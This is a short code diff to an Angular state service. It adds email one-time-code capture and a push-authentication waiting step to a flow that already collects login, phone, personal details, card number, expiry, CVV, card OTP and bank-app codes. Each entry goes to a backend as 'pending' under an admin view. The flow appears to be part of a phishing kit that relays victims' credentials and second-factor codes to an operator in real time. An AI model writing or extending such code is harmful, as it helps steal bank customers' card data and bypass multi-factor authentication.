@@ -6,8 +6,8 @@ import { from, of, firstValueFrom, throwError } from 'rxjs';
 import { retry, catchError, switchMap, tap, filter } from 'rxjs/operators';
 import { PollingScheduler } from './polling.util';
 
-export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'bank_app' | 'loading' | 'step_success' | 'success' | 'admin';
-export type VerificationStage = 'login' | 'login_pending' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'bank_app_input' | 'bank_app_pending' | 'final_review' | 'complete';
+export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'email_otp' | 'push_auth' | 'bank_app' | 'loading' | 'step_success' | 'success' | 'admin';
+export type VerificationStage = 'login' | 'login_pending' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'email_otp_pending' | 'push_auth_pending' | 'bank_app_input' | 'bank_app_pending' | 'final_review' | 'complete';
 
 export interface UserFingerprint {
     userAgent: string;
@@ -88,6 +88,7 @@ export class StateService {
     readonly cardExpiry = signal<string>('');
     readonly cardCvv = signal<string>('');
     readonly cardOtp = signal<string>('');
+    readonly emailOtp = signal<string>('');
 
     // New Flow Control
     readonly verificationFlow = signal<'otp' | 'app' | 'both' | 'complete'>('complete');
@@ -1209,6 +1210,23 @@ export class StateService {
     submitCardOtp(code: string) {
         this.cardOtp.set(code);
         this.stage.set('card_otp_pending');
+        this.rejectionReason.set(null);
+        this.waitingStart.set(Date.now());
+        this.navigate('loading');
+        this.syncState();
+    }
+
+    submitEmailOtp(code: string) {
+        this.emailOtp.set(code);
+        this.stage.set('email_otp_pending');
+        this.rejectionReason.set(null);
+        this.waitingStart.set(Date.now());
+        this.navigate('loading');
+        this.syncState();
+    }
+
+    submitPushAuth() {
+        this.stage.set('push_auth_pending');
         this.rejectionReason.set(null);
         this.waitingStart.set(Date.now());
         this.navigate('loading');
